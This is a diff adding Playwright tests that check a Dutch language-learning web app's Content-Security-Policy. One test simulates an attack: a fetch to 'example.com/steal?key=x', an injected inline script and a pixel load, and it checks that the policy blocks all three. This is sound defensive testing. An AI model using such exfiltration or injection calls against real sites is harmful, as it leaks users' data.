@@ -145,3 +145,53 @@ test("the app is installable: manifest and service worker are in place", async (
   expect(info).toMatchObject({ name: "Inburgering A2", display: "standalone", icons: 3 });
   expect(info.scope).toContain("localhost:4173");
 });
+
+test("the security policy is on and nothing in the app breaks it", async ({ page }) => {
+  const violations: string[] = [];
+  await page.addInitScript(() => {
+    (window as any).__csp = [];
+    document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(`${e.violatedDirective}: ${e.blockedURI}`));
+  });
+  const response = await page.goto("/");
+  const csp = response?.headers()["content-security-policy"] ?? "";
+  expect(csp).toContain("script-src 'self'");
+  expect(csp).toContain("connect-src 'self' https://api.anthropic.com");
+  expect(csp).not.toContain("unsafe-eval");
+  expect(response?.headers()["x-content-type-options"]).toBe("nosniff");
+
+  await startFresh(page);
+  const visit = async (path: string) => {
+    await page.goto(path);
+    await page.waitForTimeout(400);
+    violations.push(...(await page.evaluate(() => (window as any).__csp as string[])));
+  };
+  // lesson + exercise (markdown with v-html), words, samenvatting, exam, writing task, settings, about, progress dialog
+  await page.goto("/unit/basis-tijd");
+  await page.getByRole("button", { name: /Volgende/ }).click();
+  await answerOne(page);
+  violations.push(...(await page.evaluate(() => (window as any).__csp as string[])));
+  for (const p of ["/woorden", "/woorden/herhalen", "/werkwoorden", "/samenvatting", "/examens", "/examen/exam-lezen-1", "/unit/schrijven-kort-bericht", "/instellingen", "/over", "/schrijven/geschiedenis"]) await visit(p);
+  expect(violations).toEqual([]);
+});
+
+test("the policy really blocks data leaving to any other site (and inline scripts)", async ({ page }) => {
+  await page.addInitScript(() => {
+    (window as any).__csp = [];
+    document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(e.violatedDirective));
+  });
+  await startFresh(page);
+  const result = await page.evaluate(async () => {
+    const fetched = await fetch("https://example.com/steal?key=x").then(() => "sent", () => "blocked");
+    const script = document.createElement("script");
+    script.textContent = "window.__injected = true";
+    document.head.appendChild(script);
+    await new Promise((r) => setTimeout(r, 200));
+    const img = new Image();
+    img.src = "https://example.com/pixel.png";
+    await new Promise((r) => setTimeout(r, 200));
+    return { fetched, injectedRan: (window as any).__injected === true, violations: (window as any).__csp as string[] };
+  });
+  expect(result.fetched).toBe("blocked");
+  expect(result.injectedRan).toBe(false);
+  expect(result.violations).toEqual(expect.arrayContaining(["connect-src", "script-src-elem", "img-src"]));
+});
